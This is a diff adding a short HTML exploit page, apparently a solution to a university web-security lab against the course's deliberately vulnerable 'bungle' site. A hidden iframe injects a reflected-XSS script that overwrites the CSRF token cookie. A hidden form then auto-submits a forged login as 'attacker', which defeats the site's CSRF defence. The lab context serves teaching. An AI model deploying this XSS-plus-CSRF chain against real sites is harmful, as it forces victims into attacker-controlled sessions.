@@ -1,0 +1,20 @@
+<iframe name="goal" onload=startHack() src="http://bungle-cs461.cs.illinois.edu/search?xssdefense=0&q=<script>{document.cookie='csrf_token=0000000000000000'}</script>" style="visibility:hidden;"></iframe>
+
+<form id='gadget' action='http://bungle-cs461.cs.illinois.edu/login?csrfdefense=1&xssdefense=0' target='goal' style="visibility:hidden;" method='post'>
+	<input name='username' value='attacker'/>
+	<input name='password' value='l33th4x'/>
+	<input name='csrf_token' value='0000000000000000'/>
+</form>
+
+<script>
+	var flag = 0;
+	function startHack()
+	{
+	    if(flag==0)
+	    {
+			flag = 1;
+		    document.getElementById('gadget').submit();
+	    }
+	}
+</script>
+
